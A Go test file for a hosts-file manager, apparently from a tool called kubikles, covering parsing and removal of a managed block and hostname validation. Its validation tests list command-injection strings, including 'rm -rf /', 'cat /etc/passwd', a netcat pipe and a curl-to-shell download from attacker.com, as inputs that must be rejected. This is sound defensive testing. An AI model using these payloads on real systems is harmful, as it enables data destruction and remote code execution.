package hosts

import (
	"testing"
)

func TestEntry_Fields(t *testing.T) {
	entry := Entry{
		IP:       "127.0.0.1",
		Hostname: "example.local",
	}

	if entry.IP != "127.0.0.1" {
		t.Errorf("expected IP '127.0.0.1', got %q", entry.IP)
	}
	if entry.Hostname != "example.local" {
		t.Errorf("expected Hostname 'example.local', got %q", entry.Hostname)
	}
}

func TestParseManagedEntries_Empty(t *testing.T) {
	content := `# Standard hosts file
127.0.0.1 localhost
`
	entries := parseManagedEntries(content)
	if len(entries) != 0 {
		t.Errorf("expected 0 entries, got %d", len(entries))
	}
}

func TestParseManagedEntries_SingleEntry(t *testing.T) {
	content := `127.0.0.1 localhost
# BEGIN kubikles-managed
127.0.0.1 myapp.local
# END kubikles-managed
`
	entries := parseManagedEntries(content)
	if len(entries) != 1 {
		t.Fatalf("expected 1 entry, got %d", len(entries))
	}
	if entries[0].IP != "127.0.0.1" {
		t.Errorf("expected IP '127.0.0.1', got %q", entries[0].IP)
	}
	if entries[0].Hostname != "myapp.local" {
		t.Errorf("expected hostname 'myapp.local', got %q", entries[0].Hostname)
	}
}

func TestParseManagedEntries_MultipleEntries(t *testing.T) {
	content := `127.0.0.1 localhost
# BEGIN kubikles-managed
127.0.0.1 app1.local
127.0.0.1 app2.local
127.0.0.1 app3.local
# END kubikles-managed
`
	entries := parseManagedEntries(content)
	if len(entries) != 3 {
		t.Fatalf("expected 3 entries, got %d", len(entries))
	}

	expected := []string{"app1.local", "app2.local", "app3.local"}
	for i, exp := range expected {
		if entries[i].Hostname != exp {
			t.Errorf("entry %d: expected hostname %q, got %q", i, exp, entries[i].Hostname)
		}
	}
}

func TestParseManagedEntries_IgnoresComments(t *testing.T) {
	content := `# BEGIN kubikles-managed
# This is a comment
127.0.0.1 app.local
# Another comment
# END kubikles-managed
`
	entries := parseManagedEntries(content)
	if len(entries) != 1 {
		t.Fatalf("expected 1 entry (comments ignored), got %d", len(entries))
	}
	if entries[0].Hostname != "app.local" {
		t.Errorf("expected hostname 'app.local', got %q", entries[0].Hostname)
	}
}

func TestParseManagedEntries_IgnoresEmptyLines(t *testing.T) {
	content := `# BEGIN kubikles-managed

127.0.0.1 app1.local

127.0.0.1 app2.local

# END kubikles-managed
`
	entries := parseManagedEntries(content)
	if len(entries) != 2 {
		t.Fatalf("expected 2 entries (empty lines ignored), got %d", len(entries))
	}
}

func TestParseManagedEntries_HandlesWhitespace(t *testing.T) {
	content := `# BEGIN kubikles-managed
  127.0.0.1   app.local
# END kubikles-managed
`
	entries := parseManagedEntries(content)
	if len(entries) != 1 {
		t.Fatalf("expected 1 entry, got %d", len(entries))
	}
	if entries[0].IP != "127.0.0.1" {
		t.Errorf("expected IP '127.0.0.1', got %q", entries[0].IP)
	}
	if entries[0].Hostname != "app.local" {
		t.Errorf("expected hostname 'app.local', got %q", entries[0].Hostname)
	}
}

func TestParseManagedEntries_IgnoresOutsideBlock(t *testing.T) {
	content := `127.0.0.1 localhost
192.168.1.1 router.local
# BEGIN kubikles-managed
127.0.0.1 managed.local
# END kubikles-managed
10.0.0.1 other.local
`
	entries := parseManagedEntries(content)
	if len(entries) != 1 {
		t.Fatalf("expected 1 entry (only inside block), got %d", len(entries))
	}
	if entries[0].Hostname != "managed.local" {
		t.Errorf("expected hostname 'managed.local', got %q", entries[0].Hostname)
	}
}

func TestParseManagedEntries_MalformedLine(t *testing.T) {
	content := `# BEGIN kubikles-managed
onlyhostname
127.0.0.1 valid.local
# END kubikles-managed
`
	entries := parseManagedEntries(content)
	if len(entries) != 1 {
		t.Fatalf("expected 1 entry (malformed ignored), got %d", len(entries))
	}
	if entries[0].Hostname != "valid.local" {
		t.Errorf("expected hostname 'valid.local', got %q", entries[0].Hostname)
	}
}

func TestBuildEntriesContent_Empty(t *testing.T) {
	content := buildEntriesContent([]Entry{})
	if content != "" {
		t.Errorf("expected empty string for no entries, got %q", content)
	}
}

func TestBuildEntriesContent_SingleEntry(t *testing.T) {
	entries := []Entry{{IP: "127.0.0.1", Hostname: "app.local"}}
	content := buildEntriesContent(entries)

	expected := "\n# BEGIN kubikles-managed\n127.0.0.1 app.local\n# END kubikles-managed\n"
	if content != expected {
		t.Errorf("content mismatch\nexpected: %q\ngot: %q", expected, content)
	}
}

func TestBuildEntriesContent_MultipleEntries(t *testing.T) {
	entries := []Entry{
		{IP: "127.0.0.1", Hostname: "app1.local"},
		{IP: "127.0.0.1", Hostname: "app2.local"},
	}
	content := buildEntriesContent(entries)

	expected := "\n# BEGIN kubikles-managed\n127.0.0.1 app1.local\n127.0.0.1 app2.local\n# END kubikles-managed\n"
	if content != expected {
		t.Errorf("content mismatch\nexpected: %q\ngot: %q", expected, content)
	}
}

func TestRemoveExistingManagedBlock_NoBlock(t *testing.T) {
	content := `127.0.0.1 localhost
192.168.1.1 router.local
`
	result := removeExistingManagedBlock(content)
	expected := "127.0.0.1 localhost\n192.168.1.1 router.local\n"
	if result != expected {
		t.Errorf("expected %q, got %q", expected, result)
	}
}

func TestRemoveExistingManagedBlock_WithBlock(t *testing.T) {
	content := `127.0.0.1 localhost
# BEGIN kubikles-managed
127.0.0.1 app.local
# END kubikles-managed
192.168.1.1 router.local
`
	result := removeExistingManagedBlock(content)
	expected := "127.0.0.1 localhost\n192.168.1.1 router.local\n"
	if result != expected {
		t.Errorf("expected %q, got %q", expected, result)
	}
}

func TestRemoveExistingManagedBlock_BlockAtEnd(t *testing.T) {
	content := `127.0.0.1 localhost
# BEGIN kubikles-managed
127.0.0.1 app.local
# END kubikles-managed
`
	result := removeExistingManagedBlock(content)
	expected := "127.0.0.1 localhost\n"
	if result != expected {
		t.Errorf("expected %q, got %q", expected, result)
	}
}

func TestRemoveExistingManagedBlock_BlockAtStart(t *testing.T) {
	content := `# BEGIN kubikles-managed
127.0.0.1 app.local
# END kubikles-managed
127.0.0.1 localhost
`
	result := removeExistingManagedBlock(content)
	expected := "127.0.0.1 localhost\n"
	if result != expected {
		t.Errorf("expected %q, got %q", expected, result)
	}
}

func TestRemoveExistingManagedBlock_MultipleEntries(t *testing.T) {
	content := `127.0.0.1 localhost
# BEGIN kubikles-managed
127.0.0.1 app1.local
127.0.0.1 app2.local
127.0.0.1 app3.local
# END kubikles-managed
`
	result := removeExistingManagedBlock(content)
	expected := "127.0.0.1 localhost\n"
	if result != expected {
		t.Errorf("expected %q, got %q", expected, result)
	}
}

func TestRemoveExistingManagedBlock_Empty(t *testing.T) {
	content := ""
	result := removeExistingManagedBlock(content)
	if result != "" {
		t.Errorf("expected empty string, got %q", result)
	}
}

func TestRemoveExistingManagedBlock_OnlyBlock(t *testing.T) {
	content := `# BEGIN kubikles-managed
127.0.0.1 app.local
# END kubikles-managed
`
	result := removeExistingManagedBlock(content)
	if result != "" {
		t.Errorf("expected empty string, got %q", result)
	}
}

func TestMarkerConstants(t *testing.T) {
	if BeginMarker != "# BEGIN kubikles-managed" {
		t.Errorf("unexpected BeginMarker: %q", BeginMarker)
	}
	if EndMarker != "# END kubikles-managed" {
		t.Errorf("unexpected EndMarker: %q", EndMarker)
	}
}

func TestNewManager(t *testing.T) {
	m := NewManager()
	if m == nil {
		t.Fatal("NewManager returned nil")
	}
	if m.hostsPath == "" {
		t.Error("hostsPath should not be empty")
	}
}

func TestParseManagedEntries_IPv6(t *testing.T) {
	content := `# BEGIN kubikles-managed
::1 ipv6.local
fe80::1 link.local
# END kubikles-managed
`
	entries := parseManagedEntries(content)
	if len(entries) != 2 {
		t.Fatalf("expected 2 entries, got %d", len(entries))
	}
	if entries[0].IP != "::1" {
		t.Errorf("expected IP '::1', got %q", entries[0].IP)
	}
	if entries[1].IP != "fe80::1" {
		t.Errorf("expected IP 'fe80::1', got %q", entries[1].IP)
	}
}

func TestBuildEntriesContent_IPv6(t *testing.T) {
	entries := []Entry{{IP: "::1", Hostname: "ipv6.local"}}
	content := buildEntriesContent(entries)

	if content == "" {
		t.Error("expected non-empty content")
	}
	if !contains(content, "::1 ipv6.local") {
		t.Error("content should contain IPv6 entry")
	}
}

func TestParseManagedEntries_MultipleAliases(t *testing.T) {
	// Hosts file entries can have multiple hostnames per line
	// We only capture the first hostname
	content := `# BEGIN kubikles-managed
127.0.0.1 primary.local secondary.local tertiary.local
# END kubikles-managed
`
	entries := parseManagedEntries(content)
	if len(entries) != 1 {
		t.Fatalf("expected 1 entry, got %d", len(entries))
	}
	// We only capture the first hostname
	if entries[0].Hostname != "primary.local" {
		t.Errorf("expected hostname 'primary.local', got %q", entries[0].Hostname)
	}
}

func TestRemoveExistingManagedBlock_PreservesOtherContent(t *testing.T) {
	content := `# /etc/hosts
# Static table lookup for hostnames
127.0.0.1 localhost
127.0.1.1 mycomputer

# BEGIN kubikles-managed
127.0.0.1 app.local
# END kubikles-managed

# Custom entries below
10.0.0.1 custom.local
`
	result := removeExistingManagedBlock(content)

	// Should preserve comments and custom entries
	if !contains(result, "# /etc/hosts") {
		t.Error("should preserve header comment")
	}
	if !contains(result, "127.0.0.1 localhost") {
		t.Error("should preserve localhost entry")
	}
	if !contains(result, "127.0.1.1 mycomputer") {
		t.Error("should preserve mycomputer entry")
	}
	if !contains(result, "10.0.0.1 custom.local") {
		t.Error("should preserve custom entries")
	}
	// Should remove managed block
	if contains(result, "app.local") {
		t.Error("should remove managed entry")
	}
}

// Tests for hostname validation (command injection prevention)

func TestValidateHostname_Valid(t *testing.T) {
	validHostnames := []string{
		"example.com",
		"app.local",
		"my-service.namespace.svc.cluster.local",
		"a.b.c.d.e.f",
		"123.456.789",
		"test-123.example.com",
		"UPPERCASE.local",
		"MixedCase.Example.COM",
		"a",
		"a1",
		"1a",
	}
	for _, h := range validHostnames {
		if err := ValidateHostname(h); err != nil {
			t.Errorf("ValidateHostname(%q) should be valid, got error: %v", h, err)
		}
	}
}

func TestValidateHostname_Invalid(t *testing.T) {
	invalidHostnames := []string{
		"",                        // empty
		"foo\"; rm -rf / #",       // command injection
		"foo$(whoami)",            // command substitution
		"foo`id`",                 // backtick execution
		"foo'bar",                 // single quote
		"foo\"bar",                // double quote
		"foo;bar",                 // semicolon
		"foo|bar",                 // pipe
		"foo&bar",                 // ampersand
		"foo>bar",                 // redirect
		"foo<bar",                 // redirect
		"foo bar",                 // space
		"foo\tbar",                // tab
		"foo\nbar",                // newline
		"-startswithhyphen.com",   // starts with hyphen
		".startwithdot.com",       // starts with dot
		"endswithhyphen-.com",     // label ends with hyphen
		string(make([]byte, 254)), // too long (254 chars)
	}
	for _, h := range invalidHostnames {
		if err := ValidateHostname(h); err == nil {
			t.Errorf("ValidateHostname(%q) should be invalid, but was accepted", h)
		}
	}
}

func TestValidateHostname_CommandInjectionAttempts(t *testing.T) {
	// These are the exact attack vectors we're preventing
	attacks := []string{
		`foo.bar"; rm -rf / #`,
		`foo.bar$(whoami)`,
		"foo.bar`id`",
		`foo.bar'; cat /etc/passwd #`,
		`foo.bar" && echo pwned`,
		`foo.bar| nc attacker.com 1234`,
		`foo.bar$(curl attacker.com/shell.sh|sh)`,
		`127.0.0.1 localhost\n127.0.0.1 evil.com`,
	}
	for _, attack := range attacks {
		if err := ValidateHostname(attack); err == nil {
			t.Errorf("SECURITY: ValidateHostname should reject attack vector %q", attack)
		}
	}
}

func TestValidateEntries_Valid(t *testing.T) {
	entries := []Entry{
		{IP: "127.0.0.1", Hostname: "app1.local"},
		{IP: "127.0.0.1", Hostname: "app2.example.com"},
	}
	if err := ValidateEntries(entries); err != nil {
		t.Errorf("ValidateEntries should accept valid entries, got: %v", err)
	}
}

func TestValidateEntries_Invalid(t *testing.T) {
	entries := []Entry{
		{IP: "127.0.0.1", Hostname: "valid.local"},
		{IP: "127.0.0.1", Hostname: "invalid;hostname"},
	}
	if err := ValidateEntries(entries); err == nil {
		t.Error("ValidateEntries should reject entries with invalid hostnames")
	}
}

func TestValidateEntries_Empty(t *testing.T) {
	if err := ValidateEntries([]Entry{}); err != nil {
		t.Errorf("ValidateEntries should accept empty slice, got: %v", err)
	}
}

// Helper function
func contains(s, substr string) bool {
	return len(s) >= len(substr) && (s == substr || len(s) > 0 && containsHelper(s, substr))
}

func containsHelper(s, substr string) bool {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}
